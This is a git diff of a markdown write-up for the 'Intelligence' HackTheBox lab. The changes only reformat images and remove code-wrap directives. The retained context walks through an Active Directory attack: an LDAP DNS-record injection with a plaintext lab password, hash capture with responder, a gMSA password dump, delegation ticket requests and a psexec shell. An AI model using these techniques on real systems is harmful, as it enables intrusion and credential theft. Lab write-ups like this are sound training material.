@@ -39,15 +39,15 @@ We can enumerate the HTTP page.
 
 Page is some kind of company website.
 
-<figure><img src="../../../.gitbook/assets/image (2639).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2639).png>)
 
 We can add `intelligence.htb` to our `/etc/hosts` file as well. Within the page, I noticed there were some downloads:
 
-<figure><img src="../../../.gitbook/assets/image (3729).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3729).png>)
 
 When we download them, we would get redirected to a PDF which did not have anything useful on it.
 
-<figure><img src="../../../.gitbook/assets/image (3110).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3110).png>)
 
 The more interesting part is the URL. For the above document, I was redirected to `http://10.129.95.154/documents/2020-01-01-upload.pdf`. We can fuzz this and see what other PDFs are present. We can create a wordlist using this:
 
@@ -185,7 +185,7 @@ $ for FILE in *; do pdftotext $FILE; done;
 
 Then, we can use `grep` to find keywords in these files.
 
-<figure><img src="../../../.gitbook/assets/image (1364).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1364).png>)
 
 We have a credential, and also searching for `security` tells me there's some type of vulnerability with the service accounts:
 
@@ -279,7 +279,6 @@ In short, we can add a node to the DNS records via LDAP which makes `intelligenc
 
 {% embed url="https://github.com/dirkjanm/krbrelayx" %}
 
-{% code overflow="wrap" %}
 ```bash
 $ python3 ~/usefulfiles/krbrelayx/dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876  --action add --record 'test.intelligence.htb' --data 10.10.14.13 10.129.95.154 
 [-] Connecting to host...
@@ -288,11 +287,9 @@ $ python3 ~/usefulfiles/krbrelayx/dnstool.py -u intelligence\\Tiffany.Molina -p 
 [-] Adding new record
 [+] LDAP operation completed successfully
 ```
-{% endcode %}
 
 Then, we can start `responder` and wait. Eventually, we would capture a hash that we can crack.
 
-{% code overflow="wrap" %}
 ```
 $ sudo responder -I tun0
 [+] Listening for events...                          
@@ -310,7 +307,6 @@ Mr.Teddy         (Ted.Graves)
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed
 ```
-{% endcode %}
 
 We now have a new user. We still cannot login though.
 
@@ -348,15 +344,15 @@ INFO: Done in 00M 04S
 
 Then we can start `neo4j` and `bloodhound`. After uploading the information, let's view what `Ted.Graves` has access to. We find that they are part of the ITSupport group.
 
-<figure><img src="../../../.gitbook/assets/image (3801).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3801).png>)
 
 This group has ReadGMSAPassword privileges over `svc_int`.
 
-<figure><img src="../../../.gitbook/assets/image (2224).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2224).png>)
 
 USing `gMSADumper.py`, we can get a hash for this user:
 
-<figure><img src="../../../.gitbook/assets/image (3458).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3458).png>)
 
 This cannot be cracked, but Pass The Hash can still be done.
 
@@ -366,7 +362,7 @@ This cannot be cracked, but Pass The Hash can still be done.
 
 When checking this node, we see that it is allowed to delegate for the DC.
 
-<figure><img src="../../../.gitbook/assets/image (3992).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3992).png>)
 
 We don't have a shell to the machine, but with this we can request service tickets for the administrator. We can use `getST.py` to do this.
 
@@ -388,4 +384,4 @@ $ export KRB5CCNAME = Administrator.ccache
 
 Then we can get a shell using `psexec.py`.
 
-<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1227).png>)
